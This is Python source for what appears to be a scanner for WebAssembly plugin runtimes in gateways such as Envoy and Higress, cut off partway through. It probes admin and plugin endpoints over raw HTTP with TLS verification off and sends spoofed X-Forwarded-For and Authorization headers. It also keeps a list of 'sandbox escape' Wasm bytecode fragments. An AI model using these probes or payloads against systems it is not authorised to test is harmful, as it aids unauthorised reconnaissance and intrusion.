"""
Wasm Runtime Analyzer - Wasm Runtime Attack Analyzer
Evaluate attacks on systems that use Wasm plugins, such as Envoy Higress.
"""

import asyncio
import socket
import ssl
import time
import hashlib
import struct
import random
import base64
from typing import Dict, List, Optional, Tuple, Any
from collections import deque
from datetime import datetime
import json
from pathlib import Path

# Optional wasmtime import (real WASM execution backend)
try:
    import wasmtime  # type: ignore
except Exception:
    wasmtime = None  # Fallback when dependency is missing; handled at runtime


class WasmRuntimeAnalyzer:
    """
    WebAssembly分析
    1. Wasm模块检测和指纹识别
    2. 沙箱隔离机制测试
    3. 插件生命周期攻击
    4. 内存安全漏洞挖掘
    5. 模块间通信分析
    """
    
    def __init__(self, target_host: str, target_port: int = 80, timeout: float = 5.0,
                 local_wasm_path: Optional[str] = None,
                 wasm_entry: Optional[str] = None,
                 wasi_args: Optional[List[str]] = None,
                 wasi_env: Optional[Dict[str, str]] = None,
                 wasi_inherit_stdio: bool = True):
        self.target_host = target_host
        self.target_port = target_port
        self.timeout = timeout
        # Local WASM execution settings (optional)
        self.local_wasm_path = local_wasm_path
        self.wasm_entry = wasm_entry
        self.wasi_args = list(wasi_args or [])
        self.wasi_env = dict(wasi_env or {})
        self.wasi_inherit_stdio = wasi_inherit_stdio
        
        # SSL上下文配置
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
        # Wasm特征数据库
        self.wasm_signatures = {
            'magic_numbers': [b'\x00asm', b'wasm'],
            'module_headers': [b'\x00\x61\x73\x6d', b'\x01\x00\x00\x00'],
            'section_types': [0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b],
            'function_signatures': [b'\x60', b'\x7f', b'\x7e', b'\x7d', b'\x7c']
        }
        
        # 攻击历史记录
        self.attack_history = deque(maxlen=200)
        self.timing_samples = deque(maxlen=100)
        
        # 沙箱逃逸payload库
        self.sandbox_escape_payloads = [
            # 内存越界访问
            b'\x20\x00\x41\xff\xff\xff\xff\x0f\x36\x02\x00',  # i32.store offset=0xffffffff
            # 栈溢出尝试
            b'\x02\x40' + b'\x10\x00' * 1000 + b'\x0b',  # 深度递归调用
            # 类型混淆
            b'\x20\x00\xbc\x20\x00\xbe',  # f32.reinterpret_i32 -> f64.reinterpret_i64
            # 控制流劫持
            b'\x41\x00\x0c\x00',  # br 0 (无条件跳转)
        ]
    
    async def comprehensive_wasm_security_analysis(self, posture: str = 'intelligent') -> Dict:
        """执行全面的Wasm运行时安全分析
        
        Args:
            posture: 分析姿态
                - 'intelligent': 智能适应模式，根据阶段1检测结果决定后续策略
                - 'deep': 深度探测模式，即使检测度低也进行全面分析
                - 'paranoid': 偏执模式，无条件执行所有测试
        """
        
        print(f"[*] Starting comprehensive WebAssembly runtime security analysis...")
        print(f"[*] Target: {self.target_host}:{self.target_port}")
        print(f"[*] Analysis Posture: {posture.upper()}")
        print(f"[*] Analysis based on next-gen cloud-native attack vectors")
        print(f"="*70)
        
        analysis_results = {
            'runtime_detection': {},
            'plugin_analysis': {},
            'sandbox_security': {},
            'memory_safety': {},
            'injection_vectors': {},
            'timing_attacks': {},
            'overall_assessment': {}
        }
        
        try:
            # 可选阶段0: 本地WASM模块执行（真实执行，不再占位）
            if self.local_wasm_path:
                print(f"\n[PHASE 0] Local WASM Module Execution (wasmtime)")
                print(f"-" * 50)
                local_exec = await self._execute_local_wasm_module()
                analysis_results['local_wasm_execution'] = local_exec
                status = local_exec.get('status', 'UNKNOWN')
                print(f"[+] Phase 0 results: {status} | time: {local_exec.get('execution_time_ms', 0)} ms | exports: {len(local_exec.get('exports', []))}")
            else:
                analysis_results['local_wasm_execution'] = {
                    'status': 'SKIPPED',
                    'reason': 'No --local-wasm provided'
                }

            # 阶段1: Wasm运行时检测和指纹识别
            print(f"\n[PHASE 1] Wasm Runtime Detection & Fingerprinting")
            print(f"-" * 50)
            runtime_detection = await self._detect_wasm_runtime()
            analysis_results['runtime_detection'] = runtime_detection
            
            confidence = runtime_detection.get('confidence_score', 0)
            runtime_type = runtime_detection.get('runtime_type', 'Unknown')
            methods_found = len(runtime_detection.get('detection_methods', []))
            wasm_detected = runtime_detection.get('wasm_detected', False)
            
            # Phase 1 摘要
            print(f"[+] Phase 1 results: {methods_found} detection methods triggered, confidence: {confidence}%, type: {runtime_type}")
            
            # **智能姿态控制** - 根据posture和检测结果决定后续执行策略
            should_continue_full_analysis = True
            analysis_reason = ""
            
            if posture == 'paranoid':
                analysis_reason = "PARANOID mode: Executing all phases regardless of detection results"
                print(f"[!] {analysis_reason}")
            elif posture == 'deep':
                if confidence < 25:
                    analysis_reason = "DEEP mode: Low confidence detected, performing thorough exploration for hidden Wasm capabilities"
                else:
                    analysis_reason = "DEEP mode: Performing comprehensive analysis to uncover advanced attack vectors"
                print(f"[*] {analysis_reason}")
            elif posture == 'intelligent':
                if confidence == 0:
                    should_continue_full_analysis = False
                    analysis_reason = "INTELLIGENT mode: No Wasm indicators detected, skipping intensive security phases"
                    print(f"[*] {analysis_reason}")
                    print(f"[*] Tip: Use --posture deep or --posture paranoid to force comprehensive analysis")
                elif confidence < 40:
                    analysis_reason = f"INTELLIGENT mode: Low confidence ({confidence}%) - performing targeted verification"
                    print(f"[*] {analysis_reason}")
                else:
                    analysis_reason = f"INTELLIGENT mode: Wasm runtime confirmed ({confidence}%) - executing full security analysis"
                    print(f"[+] {analysis_reason}")
            
            # 记录决策原因
            analysis_results['analysis_posture'] = posture
            analysis_results['analysis_reason'] = analysis_reason
            analysis_results['full_analysis_executed'] = should_continue_full_analysis
            
            # 阶段2: 插件系统分析 - 条件执行
            if should_continue_full_analysis or posture in ['deep', 'paranoid']:
                print(f"\n[PHASE 2] Plugin System Analysis")
                print(f"-" * 50)
                plugin_analysis = await self._analyze_plugin_system()
                analysis_results['plugin_analysis'] = plugin_analysis
            else:
                print(f"\n[PHASE 2] Plugin System Analysis")
                print(f"-" * 50)
                print(f"[SKIP] Skipped in INTELLIGENT mode due to low Wasm confidence")
                plugin_analysis = {
                    'status': 'SKIPPED',
                    'reason': 'Insufficient Wasm detection confidence'
                }
                analysis_results['plugin_analysis'] = plugin_analysis
            
            # Phase 2 摘要
            if plugin_analysis.get('status') == 'SKIPPED':
                print(f"[SKIP] Phase 2 skipped due to analysis posture")
            else:
                plugin_discovery = plugin_analysis.get('plugin_discovery', {})
                plugins_found = len(plugin_discovery.get('discovered_plugins', []))
                lifecycle_analysis = plugin_analysis.get('lifecycle_analysis', {})
                lifecycle_tested = len(lifecycle_analysis.get('lifecycle_tests', []))
                plugin_isolation = plugin_analysis.get('plugin_isolation', {})
                isolation_level = plugin_isolation.get('isolation_level', 'Unknown')
                print(f"[+] Phase 2 results: {plugins_found} plugins discovered, {lifecycle_tested} lifecycle tests, isolation: {isolation_level}")
            
            # 阶段3: 沙箱安全评估 - 条件执行
            if should_continue_full_analysis or posture in ['deep', 'paranoid']:
                print(f"\n[PHASE 3] Sandbox Security Assessment") 
                print(f"-" * 50)
                sandbox_security = await self._assess_sandbox_security()
                analysis_results['sandbox_security'] = sandbox_security
            else:
                print(f"\n[PHASE 3] Sandbox Security Assessment") 
                print(f"-" * 50)
                print(f"[SKIP] Skipped in INTELLIGENT mode due to low Wasm confidence")
                sandbox_security = {
                    'status': 'SKIPPED',
                    'reason': 'Insufficient Wasm detection confidence'
                }
                analysis_results['sandbox_security'] = sandbox_security
            
            # Phase 3 摘要
            if sandbox_security.get('status') == 'SKIPPED':
                print(f"[SKIP] Phase 3 skipped due to analysis posture")
            else:
                escape_vectors = len(sandbox_security.get('escape_vectors', []))
                security_score = sandbox_security.get('security_score', 0)
                vulnerabilities = len([v for v in sandbox_security.get('tests', []) if v.get('vulnerable', False)])
                total_tests = len(sandbox_security.get('tests', []))
                print(f"[+] Phase 3 results: {escape_vectors} escape vectors, {vulnerabilities}/{total_tests} tests vulnerable, score: {security_score}/100")
            
            # 阶段4: 内存安全分析 - 条件执行
            if should_continue_full_analysis or posture in ['deep', 'paranoid']:
                print(f"\n[PHASE 4] Memory Safety Analysis")
                print(f"-" * 50)
                memory_safety = await self._analyze_memory_safety()
                analysis_results['memory_safety'] = memory_safety
            else:
                print(f"\n[PHASE 4] Memory Safety Analysis")
                print(f"-" * 50)
                print(f"[SKIP] Skipped in INTELLIGENT mode due to low Wasm confidence")
                memory_safety = {
                    'status': 'SKIPPED',
                    'reason': 'Insufficient Wasm detection confidence',
                    'overall_protection': 'UNKNOWN'
                }
                analysis_results['memory_safety'] = memory_safety
            
            # Phase 4 摘要 - 更新以显示详细状态
            if memory_safety.get('status') == 'SKIPPED':
                print(f"[SKIP] Phase 4 skipped due to analysis posture")
            else:
                protection_level = memory_safety.get('overall_protection', 'Unknown')
                protection_reason = memory_safety.get('protection_reason', '')
                
                # 统计测试状态
                buffer_tests = memory_safety.get('buffer_overflow_protection', {})
                tested_count = buffer_tests.get('tested_count', 0)
                inconclusive_count = buffer_tests.get('inconclusive_count', 0)
                
                # 统计其他测试的状态
                uaf_status = memory_safety.get('use_after_free_detection', {}).get('status', 'UNKNOWN')
                df_status = memory_safety.get('double_free_detection', {}).get('status', 'UNKNOWN')
                
                status_summary = []
                if tested_count > 0:
                    status_summary.append(f"{tested_count} tests executed")
                if inconclusive_count > 0:
                    status_summary.append(f"{inconclusive_count} inconclusive")
                if uaf_status != 'UNKNOWN':
                    status_summary.append(f"UAF: {uaf_status}")
                if df_status != 'UNKNOWN':
                    status_summary.append(f"DF: {df_status}")
                    
                status_text = ', '.join(status_summary) if status_summary else 'Limited coverage'
                print(f"[+] Phase 4 results: {status_text}, protection level: {protection_level}")
                
                if protection_level == 'INCONCLUSIVE':
                    print(f"    Note: {protection_reason}")
                elif protection_level == 'LOW':
                    print(f"    Warning: {protection_reason}")
            
            # 阶段5: 注入攻击向量评估
            print(f"\n[PHASE 5] Injection Vector Assessment")
            print(f"-" * 50)
            injection_vectors = await self._assess_injection_vectors()
            analysis_results['injection_vectors'] = injection_vectors
            
            # Phase 5 摘要 - 显示诚实状态
            injection_categories = ['code_injection', 'data_injection', 'configuration_injection', 'memory_injection']
            not_implemented_count = 0
            implemented_count = 0
            
            for category in injection_categories:
                category_result = injection_vectors.get(category, {})
                if category_result.get('status') == 'NOT_IMPLEMENTED':
                    not_implemented_count += 1
                else:
                    implemented_count += 1
            
            if not_implemented_count == len(injection_categories):
                print(f"[*] Phase 5 results: SKIPPED (All injection analysis features are placeholders - not yet implemented)")
                print(f"    Status: {not_implemented_count}/4 analysis modules are development placeholders")
            else:
                print(f"[+] Phase 5 results: {implemented_count} implemented, {not_implemented_count} placeholder modules")
            
            # 阶段6: 时序攻击分析
            print(f"\n[PHASE 6] Timing Attack Analysis")
            print(f"-" * 50)
            timing_attacks = await self._analyze_timing_attacks()
            analysis_results['timing_attacks'] = timing_attacks
            
            # Phase 6 摘要 - 显示诚实状态
            attack_vectors = timing_attacks.get('attack_vectors', [])
            not_implemented_timing = sum(1 for attack in attack_vectors if attack.get('status') == 'NOT_IMPLEMENTED')
            implemented_timing = len(attack_vectors) - not_implemented_timing
            timing_confidence = timing_attacks.get('confidence_score', 0)
            
            if not_implemented_timing == len(attack_vectors) and len(attack_vectors) > 0:
                print(f"[*] Phase 6 results: SKIPPED (All timing analysis features are placeholders - not yet implemented)")
                print(f"    Status: {not_implemented_timing}/{len(attack_vectors)} timing analysis modules are development placeholders")
            else:
                exploitable_count = len([attack for attack in attack_vectors if attack.get('exploitable', False)])
                print(f"[+] Phase 6 results: {exploitable_count} exploitable, {implemented_timing} implemented, {not_implemented_timing} placeholder, confidence: {timing_confidence}%")
            
            # 阶段7: 综合评估
            print(f"\n[PHASE 7] Overall Security Assessment")
            print(f"-" * 50)
            overall_assessment = self._generate_overall_assessment(analysis_results)
            analysis_results['overall_assessment'] = overall_assessment
            
            # Phase 7 摘要 (最终结果)
            final_score = overall_assessment.get('security_score', 0)
            risk_level = overall_assessment.get('risk_level', 'Unknown')
            critical_vulns_list = overall_assessment.get('critical_vulnerabilities', [])
            attack_vectors_list = overall_assessment.get('attack_vectors', [])
            critical_vulns = len(critical_vulns_list)
            attack_vectors = len(attack_vectors_list)
            print(f"[+] Analysis complete: Security score {final_score}/100, Risk level {risk_level}, {critical_vulns} critical vulnerabilities, {attack_vectors} attack vectors")
            
            # 详细结果显示
            if critical_vulns > 0:
                print(f"[!] Critical vulnerabilities found:")
                for i, vuln in enumerate(critical_vulns_list, 1):
                    print(f"    {i}. {vuln}")
            
            if attack_vectors > 0:
                print(f"[!] Attack vectors identified:")
                for i, vector in enumerate(attack_vectors_list, 1):
                    print(f"    {i}. {vector}")
                    
            if critical_vulns == 0 and attack_vectors == 0:
                print(f"[+] No critical vulnerabilities or attack vectors detected")
            
            return analysis_results
            
        except Exception as e:
            print(f"[-] Analysis failed: {e}")
            return {
                'error': f"Wasm analysis failed: {e}",
                'partial_results': analysis_results
            }
    
    async def _detect_wasm_runtime(self) -> Dict:
        """检测Wasm运行时环境"""
        
        detection_results = {
            'wasm_detected': False,
            'runtime_type': 'Unknown',
            'confidence_score': 0,
            'detection_methods': [],
            'runtime_features': [],
            'version_info': {}
        }
        
        try:
            print(f"[*] Detecting Wasm runtime through multiple vectors...")
            
            # 方法1: HTTP响应头分析
            header_detection = await self._detect_via_headers()
            if header_detection['detected']:
                print(f"    HTTP Headers: WASM indicators found (+30%)")
                detection_results['wasm_detected'] = True
                detection_results['confidence_score'] += 30
                detection_results['detection_methods'].append('HTTP_Headers')
                detection_results['runtime_features'].extend(header_detection['features'])
            else:
                print(f"    HTTP Headers: No WASM indicators")
            
            # 方法2: 时序模式分析 (降低权重减少误报)
            timing_detection = await self._detect_via_timing_patterns()
            if timing_detection['detected']:
                print(f"    Timing Patterns: WASM compilation patterns detected (+15%)")
                detection_results['wasm_detected'] = True
                detection_results['confidence_score'] += 15  # 从25降低到15
                detection_results['detection_methods'].append('Timing_Patterns')
                detection_results['runtime_features'].extend(timing_detection['patterns'])
            else:
                print(f"    Timing Patterns: No significant patterns")
            
            # 方法3: 错误响应分析
            error_detection = await self._detect_via_error_responses()
            if error_detection['detected']:
                print(f"    Error Analysis: WASM-specific error patterns (+20%)")
                detection_results['wasm_detected'] = True
                detection_results['confidence_score'] += 20
                detection_results['detection_methods'].append('Error_Analysis')
                detection_results['runtime_features'].extend(error_detection['indicators'])
            else:
                print(f"    Error Analysis: Standard error responses")
            
            # 方法4: 内容类型探测
            content_detection = await self._detect_via_content_types()
            if content_detection['detected']:
                print(f"    Content Types: WASM content types supported (+15%)")
                detection_results['wasm_detected'] = True
                detection_results['confidence_score'] += 15
                detection_results['detection_methods'].append('Content_Types')
                detection_results['runtime_features'].extend(content_detection['types'])
            else:
                print(f"    Content Types: No WASM support detected")
            
            # 方法5: 管理接口探测
            admin_detection = await self._detect_via_admin_interfaces()
            if admin_detection['detected']:
                print(f"    Admin Interfaces: WASM management endpoints found (+10%)")
                detection_results['wasm_detected'] = True
                detection_results['confidence_score'] += 10
                detection_results['detection_methods'].append('Admin_Interfaces')
                detection_results['runtime_features'].extend(admin_detection['interfaces'])
            else:
                print(f"    Admin Interfaces: No WASM management endpoints")
            
            # 确定运行时类型
            detection_results['runtime_type'] = self._determine_runtime_type(detection_results)
            
            print(f"[*] Detection confidence: {detection_results['confidence_score']}/100")
            print(f"[*] Runtime type: {detection_results['runtime_type']}")
            
        except Exception as e:
            detection_results['error'] = str(e)
        
        return detection_results
    
    async def _detect_via_headers(self) -> Dict:
        """通过HTTP响应头检测Wasm"""
        
        try:
            # 发送探测请求
            reader, writer = await self._create_connection()
            
            request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                f"User-Agent: WasmRuntimeProbe/1.0\r\n"
                f"Accept: application/wasm,*/*\r\n"
                f"Connection: close\r\n\r\n"
            )
            
            writer.write(request.encode())
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(2048), timeout=self.timeout)
            response_text = response.decode('utf-8', errors='ignore')
            
            await self._close_connection(writer)
            
            # 分析Wasm相关头部
            wasm_headers = [
                'x-wasm-', 'wasm-', 'envoy-wasm', 'x-envoy-', 
                'x-plugin-', 'webassembly', 'wasmtime', 'wasmer'
            ]
            
            found_features = []
            for line in response_text.split('\r\n'):
                if ':' in line:
                    header_name = line.split(':')[0].lower()
                    header_value = line.split(':', 1)[1].strip().lower()
                    
                    for wasm_pattern in wasm_headers:
                        if wasm_pattern in header_name or wasm_pattern in header_value:
                            found_features.append(f"Header: {line.strip()}")
            
            return {
                'detected': len(found_features) > 0,
                'features': found_features,
                'response_preview': response_text[:500]
            }
            
        except Exception as e:
            return {
                'detected': False,
                'features': [],
                'error': str(e)
            }
    
    async def _detect_via_timing_patterns(self) -> Dict:
        """通过时序模式检测Wasm编译缓存"""
        
        try:
            print(f"[*] Analyzing Wasm compilation timing patterns...")
            
            timing_tests = []
            
            # 测试1: 首次vs后续请求（编译缓存检测）
            first_time = await self._measure_request_time("/", {'X-Wasm-Load': 'first'})
            await asyncio.sleep(0.3)
            second_time = await self._measure_request_time("/", {'X-Wasm-Load': 'cached'})
            
            caching_ratio = first_time / second_time if second_time > 0 else 1.0
            
            timing_tests.append({
                'test': 'compilation_caching',
                'first_request': first_time,
                'second_request': second_time,
                'ratio': caching_ratio,
                'likely_wasm': caching_ratio > 1.4  # 首次请求慢40%以上
            })
            
            # 测试2: 复杂vs简单操作
            simple_time = await self._measure_request_time("/favicon.ico")
            complex_time = await self._measure_request_time("/", {'X-Complex-Operation': 'true'})
            
            complexity_ratio = complex_time / simple_time if simple_time > 0 else 1.0
            
            timing_tests.append({
                'test': 'operation_complexity',
                'simple_time': simple_time,
                'complex_time': complex_time,
                'ratio': complexity_ratio,
                'likely_wasm': complexity_ratio > 2.0  # 复杂操作慢2倍以上
            })
            
            # 测试3: 模块加载延迟
            module_time = await self._measure_request_time("/", {'X-Force-Module-Load': 'true'})
            normal_time = await self._measure_request_time("/")
            
            module_ratio = module_time / normal_time if normal_time > 0 else 1.0
            
            timing_tests.append({
                'test': 'module_loading',
                'module_time': module_time,
                'normal_time': normal_time,
                'ratio': module_ratio,
                'likely_wasm': module_ratio > 1.3
            })
            
            # 综合判断 - 提高检测阈值避免误报
            wasm_indicators = [test for test in timing_tests if test.get('likely_wasm', False)]
            strong_indicators = [test for test in timing_tests if test['ratio'] > 2.5]  # 强指标
            detected = len(wasm_indicators) >= 3 and len(strong_indicators) >= 1  # 需要3个指标且至少1个强指标
            
            return {
                'detected': detected,
                'patterns': [f"{test['test']}: ratio {test['ratio']:.2f}" for test in timing_tests],
                'timing_tests': timing_tests,
                'wasm_indicators': len(wasm_indicators)
            }
            
        except Exception as e:
            return {
                'detected': False,
                'patterns': [],
                'error': str(e)
            }
    
    async def _measure_request_time(self, path: str, headers: Dict = None) -> float:
        """测量请求响应时间"""
        
        try:
            start_time = time.perf_counter()
            
            reader, writer = await self._create_connection()
            
            # 构建请求
            request_lines = [f"GET {path} HTTP/1.1", f"Host: {self.target_host}"]
            if headers:
                for key, value in headers.items():
                    request_lines.append(f"{key}: {value}")
            request_lines.extend(["Connection: close", "", ""])
            
            request = "\r\n".join(request_lines)
            
            writer.write(request.encode())
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
            
            await self._close_connection(writer)
            
            return (time.perf_counter() - start_time) * 1000  # 返回毫秒
            
        except Exception:
            return 0.0
    
    async def _detect_via_error_responses(self) -> Dict:
        """通过错误响应检测Wasm特征"""
        
        try:
            wasm_error_paths = [
                '/wasm', '/.wasm', '/webassembly', '/plugins',
                '/envoy/wasm', '/admin/wasm', '/wasm/modules'
            ]
            
            found_indicators = []
            
            for path in wasm_error_paths[:4]:  # 限制测试数量
                try:
                    reader, writer = await self._create_connection()
                    
                    request = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {self.target_host}\r\n"
                        f"Connection: close\r\n\r\n"
                    )
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.read(1024), timeout=3.0)
                    response_text = response.decode('utf-8', errors='ignore')
                    
                    await self._close_connection(writer)
                    
                    # 检查Wasm相关错误信息
                    wasm_error_patterns = [
                        'wasm', 'webassembly', 'wasmtime', 'wasmer', 
                        'plugin', 'module', 'envoy', 'runtime'
                    ]
                    
                    found_patterns = []
                    for pattern in wasm_error_patterns:
                        if pattern in response_text.lower():
                            found_patterns.append(pattern)
                    
                    if found_patterns:
                        found_indicators.append({
                            'path': path,
                            'patterns': found_patterns,
                            'response_preview': response_text[:200]
                        })
                        
                except Exception:
                    continue
            
            return {
                'detected': len(found_indicators) > 0,
                'indicators': found_indicators,
                'total_paths_tested': len(wasm_error_paths[:4])
            }
            
        except Exception as e:
            return {
                'detected': False,
                'indicators': [],
                'error': str(e)
            }
    
    async def _detect_via_content_types(self) -> Dict:
        """通过内容类型检测Wasm支持"""
        
        try:
            # 请求Wasm相关内容类型
            wasm_content_types = [
                'application/wasm',
                'application/webassembly',
                'application/wasm+json'
            ]
            
            supported_types = []
            
            for content_type in wasm_content_types:
                try:
                    reader, writer = await self._create_connection()
                    
                    request = (
                        f"GET / HTTP/1.1\r\n"
                        f"Host: {self.target_host}\r\n"
                        f"Accept: {content_type}\r\n"
                        f"Connection: close\r\n\r\n"
                    )
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.read(1024), timeout=3.0)
                    response_text = response.decode('utf-8', errors='ignore')
                    
                    await self._close_connection(writer)
                    
                    # 检查服务器是否理解Wasm内容类型
                    if '406' not in response_text and '415' not in response_text:
                        # 服务器没有拒绝Wasm内容类型
                        supported_types.append(content_type)
                        
                except Exception:
                    continue
            
            return {
                'detected': len(supported_types) > 0,
                'types': supported_types,
                'evidence': f"Server accepts {len(supported_types)} Wasm content types"
            }
            
        except Exception as e:
            return {
                'detected': False,
                'types': [],
                'error': str(e)
            }
    
    async def _detect_via_admin_interfaces(self) -> Dict:
        """通过管理接口检测Wasm"""
        
        try:
            admin_endpoints = [
                '/admin/wasm', '/stats/wasm', '/config/plugins',
                '/envoy/admin', '/runtime/config', '/plugins/status'
            ]
            
            accessible_interfaces = []
            
            for endpoint in admin_endpoints[:3]:  # 限制测试数量
                try:
                    reader, writer = await self._create_connection()
                    
                    request = (
                        f"GET {endpoint} HTTP/1.1\r\n"
                        f"Host: {self.target_host}\r\n"
                        f"Connection: close\r\n\r\n"
                    )
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.read(1024), timeout=3.0)
                    response_text = response.decode('utf-8', errors='ignore')
                    
                    await self._close_connection(writer)
                    
                    if '200 OK' in response_text:
                        accessible_interfaces.append({
                            'endpoint': endpoint,
                            'accessible': True,
                            'wasm_content': 'wasm' in response_text.lower() or 'plugin' in response_text.lower()
                        })
                        
                except Exception:
                    continue
            
            return {
                'detected': any(iface.get('wasm_content', False) for iface in accessible_interfaces),
                'interfaces': accessible_interfaces,
                'total_accessible': len(accessible_interfaces)
            }
            
        except Exception as e:
            return {
                'detected': False,
                'interfaces': [],
                'error': str(e)
            }
    
    def _determine_runtime_type(self, detection_results: Dict) -> str:
        """确定Wasm运行时类型"""
        
        confidence = detection_results.get('confidence_score', 0)
        features = detection_results.get('runtime_features', [])
        methods = detection_results.get('detection_methods', [])
        
        # 基于特征判断运行时类型
        feature_text = ' '.join(str(f) for f in features).lower()
        
        if 'envoy' in feature_text:
            return 'Envoy_Proxy_with_Wasm'
        elif 'higress' in feature_text:
            return 'Higress_Gateway_with_Wasm'
        elif 'wasmtime' in feature_text:
            return 'Wasmtime_Runtime'
        elif 'wasmer' in feature_text:
            return 'Wasmer_Runtime'
        elif confidence >= 70:
            return 'Generic_Wasm_Runtime'
        elif confidence >= 50:
            return 'Likely_Wasm_Enabled'
        elif confidence >= 25:
            return 'Possible_Wasm_Support'
        else:
            return 'Traditional_Architecture'
    
    async def _create_connection(self) -> Tuple[asyncio.StreamReader, asyncio.StreamWriter]:
        """创建网络连接"""
        
        if self.target_port == 443:
            return await asyncio.wait_for(
                asyncio.open_connection(self.target_host, self.target_port, ssl=self.ssl_context),
                timeout=self.timeout
            )
        else:
            return await asyncio.wait_for(
                asyncio.open_connection(self.target_host, self.target_port),
                timeout=self.timeout
            )
    
    async def _close_connection(self, writer: asyncio.StreamWriter):
        """关闭网络连接"""
        
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass
    
    async def _analyze_plugin_system(self) -> Dict:
        """分析Wasm插件系统"""
        
        plugin_analysis = {
            'plugin_discovery': {},
            'lifecycle_analysis': {},
            'communication_channels': {},
            'configuration_security': {},
            'plugin_isolation': {}
        }
        
        try:
            print(f"[*] Discovering active Wasm plugins...")
            
            # 1. 插件发现
            plugin_discovery = await self._discover_wasm_plugins()
            plugin_analysis['plugin_discovery'] = plugin_discovery
            
            # 2. 插件生命周期分析
            print(f"[*] Analyzing plugin lifecycle...")
            lifecycle_analysis = await self._analyze_plugin_lifecycle()
            plugin_analysis['lifecycle_analysis'] = lifecycle_analysis
            
            # 3. 插件间通信分析
            print(f"[*] Analyzing inter-plugin communication...")
            communication_channels = await self._analyze_plugin_communication()
            plugin_analysis['communication_channels'] = communication_channels
            
            # 4. 配置安全性评估
            print(f"[*] Assessing plugin configuration security...")
            config_security = await self._assess_plugin_config_security()
            plugin_analysis['configuration_security'] = config_security
            
            # 5. 插件隔离机制评估
            print(f"[*] Evaluating plugin isolation mechanisms...")
            plugin_isolation = await self._evaluate_plugin_isolation()
            plugin_analysis['plugin_isolation'] = plugin_isolation
            
        except Exception as e:
            plugin_analysis['error'] = str(e)
        
        return plugin_analysis
    
    async def _discover_wasm_plugins(self) -> Dict:
        """发现活跃的Wasm插件"""
        
        discovery_results = {
            'discovered_plugins': [],
            'plugin_endpoints': [],
            'plugin_metadata': {},
            'discovery_methods': []
        }
        
        try:
            # 方法1: 通过响应头发现插件
            header_plugins = await self._discover_plugins_via_headers()
            if header_plugins['found']:
                discovery_results['discovered_plugins'].extend(header_plugins['plugins'])
                discovery_results['discovery_methods'].append('Response_Headers')
            
            # 方法2: 通过特定路径探测
            path_plugins = await self._discover_plugins_via_paths()
            if path_plugins['found']:
                discovery_results['discovered_plugins'].extend(path_plugins['plugins'])
                discovery_results['discovery_methods'].append('Path_Probing')
            
            # 方法3: 通过时序分析识别插件
            timing_plugins = await self._discover_plugins_via_timing()
            if timing_plugins['found']:
                discovery_results['discovered_plugins'].extend(timing_plugins['plugins'])
                discovery_results['discovery_methods'].append('Timing_Analysis')
            
            # 方法4: 通过错误消息分析
            error_plugins = await self._discover_plugins_via_errors()
            if error_plugins['found']:
                discovery_results['discovered_plugins'].extend(error_plugins['plugins'])
                discovery_results['discovery_methods'].append('Error_Analysis')
            
            # 去重和整理
            unique_plugins = list({p['name']: p for p in discovery_results['discovered_plugins']}.values())
            discovery_results['discovered_plugins'] = unique_plugins
            
            print(f"[+] Discovered {len(unique_plugins)} potential Wasm plugins")
            if len(unique_plugins) == 0:
                print(f"[*] No active plugins found - analyzing runtime architecture for potential hosting capability")
            
        except Exception as e:
            discovery_results['error'] = str(e)
        
        return discovery_results
    
    async def _discover_plugins_via_headers(self) -> Dict:
        """通过响应头发现插件"""
        
        try:
            # 发送多种请求类型来触发不同插件
            test_requests = [
                {'path': '/', 'headers': {'User-Agent': 'PluginProbe/1.0'}},
                {'path': '/api/test', 'headers': {'Content-Type': 'application/json'}},
                {'path': '/admin', 'headers': {'Authorization': 'Bearer test'}},
                {'path': '/', 'headers': {'X-Forwarded-For': '127.0.0.1'}}
            ]
            
            found_plugins = []
            
            for request_config in test_requests:
                try:
                    reader, writer = await self._create_connection()
                    
                    # 构建请求
                    request_lines = [
                        f"GET {request_config['path']} HTTP/1.1",
                        f"Host: {self.target_host}"
                    ]
                    
                    for header, value in request_config['headers'].items():
                        request_lines.append(f"{header}: {value}")
                    
                    request_lines.extend(["Connection: close", "", ""])
                    request = "\r\n".join(request_lines)
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.read(2048), timeout=self.timeout)
                    response_text = response.decode('utf-8', errors='ignore')
                    
                    await self._close_connection(writer)
                    
                    # 分析响应头中的插件信息
                    plugin_headers = [
                        'x-wasm-plugin', 'x-envoy-plugin', 'x-plugin-', 
                        'wasm-plugin', 'plugin-info', 'x-module-'
                    ]
                    
                    for line in response_text.split('\r\n'):
                        if ':' in line:
                            header_name = line.split(':')[0].lower()
                            header_value = line.split(':', 1)[1].strip()
                            
                            for plugin_pattern in plugin_headers:
                                if plugin_pattern in header_name:
                                    found_plugins.append({
                                        'name': header_value,
                                        'type': 'header_plugin',
                                        'source': header_name,
                                        'trigger_path': request_config['path']
                                    })
                    
                    # 检查特殊的插件响应头模式
                    if 'x-powered-by' in response_text.lower():
                        powered_by_match = None
                        for line in response_text.split('\r\n'):
                            if line.lower().startswith('x-powered-by:'):
                                powered_by_value = line.split(':', 1)[1].strip()
                                if any(tech in powered_by_value.lower() for tech in ['wasm', 'envoy', 'plugin']):
                                    found_plugins.append({
                                        'name': powered_by_value,
                                        'type': 'powered_by_plugin',
                                        'source': 'x-powered-by',
                                        'trigger_path': request_config['path']
                                    })
                                break
                    
                except Exception:
                    continue
            
            return {
                'found': len(found_plugins) > 0,
                'plugins': found_plugins,
                'total_requests': len(test_requests)
            }
            
        except Exception as e:
            return {
                'found': False,
                'plugins': [],
                'error': str(e)
            }
    
    async def _discover_plugins_via_paths(self) -> Dict:
        """通过特定路径探测插件"""
        
        try:
            plugin_paths = [
                '/wasm/plugins', '/plugins', '/modules', '/wasm/modules',
